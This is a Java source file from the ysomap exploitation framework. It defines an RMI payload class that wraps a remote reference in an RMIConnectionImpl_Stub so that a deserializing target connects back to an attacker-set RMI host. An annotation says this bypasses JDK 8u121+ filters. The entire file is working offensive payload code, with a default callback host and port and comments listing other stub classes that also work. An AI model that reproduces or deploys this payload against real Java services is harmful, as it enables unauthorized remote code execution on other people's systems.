package ysomap.core.payload.java.rmi;

import sun.rmi.server.UnicastRef;
import ysomap.common.annotation.Authors;
import ysomap.common.annotation.Dependencies;
import ysomap.common.annotation.Payloads;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.bullet.jdk.rmi.RMIConnectBullet;

import javax.management.remote.rmi.RMIConnectionImpl_Stub;
import java.rmi.Remote;
import java.rmi.server.RemoteRef;

/**
 * @author wh1t3P1g
 * @since 2020/2/26
 */
@SuppressWarnings({"rawtypes"})
@Payloads
@Require(bullets = {"RMIConnectBullet"})
@Dependencies({"using to bypass jdk>=8u121","wrapped with RMIConnectionImpl_Stub object"})
@Authors({ Authors.WH1T3P1G })
public class RMIConnectWrapped extends Payload<Remote> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof UnicastRef;
    }

    @Override
    public Bullet getDefaultBullet(String command) throws Exception {
        Bullet bullet = new RMIConnectBullet();
        bullet.set("rhost","localhost");
        bullet.set("rport","1099");
        return bullet;
    }

    @Override
    public Remote pack(Object obj) throws Exception {
        // also ok
        // RMIServerImpl_Stub OK
        // RegistryImpl_Stub OK
        // DGCImpl_Stub OK
        // ReferenceWrapper_Stub
        return new RMIConnectionImpl_Stub((RemoteRef) obj);
    }
}
